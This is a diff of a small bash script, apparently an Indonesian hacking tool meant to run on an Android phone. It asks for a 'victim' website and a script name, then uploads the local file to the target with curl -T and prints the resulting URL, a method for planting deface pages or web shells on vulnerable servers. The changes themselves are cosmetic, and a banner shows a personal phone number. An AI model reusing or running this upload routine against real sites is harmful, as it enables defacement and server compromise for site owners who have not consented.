@@ -23,8 +23,8 @@ echo ""
 echo "==============================" | lolcat
 echo ""
 echo "$green Created By Me : StarFuckTak'-'"
-echo "$red Contact : 0895422939836" | lolcat
-echo "$purple S.A.D Cyber Team " | lolcat
+echo "$red Contact : 0895422939836" 
+echo "$purple S.A.D Cyber Team "
 echo ""
 echo "==============================" | lolcat
 echo ""
@@ -32,7 +32,7 @@ echo ""
 read -p "Masukkan web korban  ~# " target;
 read -p "Nama script lu coeg  ~# "  sc;
 curl -a -T /storage/emulated/0/$sc $target
-echo "Hasilnya :v |==>"  $target/$sc
+echo "Hasilnya :v |==>"  $target/$sc;
 else 
 echo "$white Gagal cuk=("
 echo "$green Mungkin Paketan Lu habis :v"
